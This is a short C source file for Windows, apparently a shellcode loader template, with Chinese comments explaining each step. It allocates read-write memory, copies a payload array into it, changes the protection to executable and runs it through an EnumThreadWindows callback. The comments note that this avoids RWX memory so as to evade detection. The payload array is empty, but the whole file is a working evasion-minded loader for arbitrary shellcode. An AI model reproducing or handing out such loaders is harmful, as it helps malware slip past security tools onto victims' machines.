#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
  DWORD oldprotect = 0;

	//shellcode在main函数内，存储在pe结构的sections table中的.text部分
	unsigned char payload[] = {};
	unsigned int payload_len = sizeof(payload);
	
	// 使用VirtualAlloc申请一个可读可写的内存，这里没有申请执行权限是为了防止出现RWX权限的敏感内存
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// 将shellcode复制到申请的内存中，这里还可以用memcpy等
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	// 使用VirtualProtect添加执行权限
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	// 如果返回正常，回调函数执行shellcode
	if ( rv != 0 ) {
			EnumThreadWindows(0, (WNDENUMPROC) exec_mem, 0);
	}

	return 0;
}
